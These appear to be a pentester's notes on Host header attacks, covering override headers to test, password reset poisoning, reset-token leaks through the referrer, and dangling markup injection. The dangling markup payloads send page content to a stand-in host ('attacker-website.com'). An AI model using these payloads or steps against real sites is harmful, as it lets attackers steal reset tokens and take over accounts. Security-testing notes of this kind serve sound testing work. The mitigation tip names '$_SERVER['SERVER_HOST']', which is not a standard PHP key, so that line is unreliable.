## Headers to test
```
X-Forwarded-Host
X-Host
X-Forwarded-Server
X-HTTP-Host-Override
Forwarded
X-Forwarded-For
```

For these, try `localhost` or `127.0.0.1` ...

---

## Param miner extension "guest headers" in Burp

---

## Tips

- Duplicate Host headers
- Absolute url
- Duplicate and add line wrapping
- Inject host override headers (see Headers to test)

---

## Password reset token leak via referrer

- Reset password
- click on the link you received by e mail
- don't change the password, instead, click on any third party pages you can see on the webpage
- intercept the request with burp and check if you have the token inside.

---

## Password reset poisoning

- Modify Host header with your server. When the victim will click on the link, thanks to the evil host headers, the password reset token will be delivered to the attacker's server. Then, use the link you received.

- Try also the other headers, or the tips.

- Try adding `:<port_or_string>` at the end and see what kind of answer you have in your inbox. Is the `:` escaped ? Can you add `<` after that ? View source page for that. Do you have to escape with single or double quote ?

- Patch it using $_SERVER['SERVER_NAME'] rather thant $_SERVER['SERVER_HOST']

### Via dangling markup

```
<input type="text" name="input" value="CONTROLLABLE DATA HERE
```

- Suppose also that the application does not filter or escape the > or " characters. An attacker can use the following syntax to break out of the quoted attribute value and the enclosing tag, and return to an HTML context: `">`

- In this situation, an attacker would naturally attempt to perform XSS. But suppose that a regular XSS attack is not possible, due to input filters, content security policy, or other obstacles. Here, it might still be possible to deliver a dangling markup injection attack using a payload like the following:
```
"><img src='//attacker-website.com?
'<href src="//attacker-website.com/?
```

- Try to find if you have to escape the context or not, and then include your < and the payload. View source page to check it.

- Here, when the victim will go on the inbox, it's will reflect it automatically, and you'll receive stuff on your server.

---




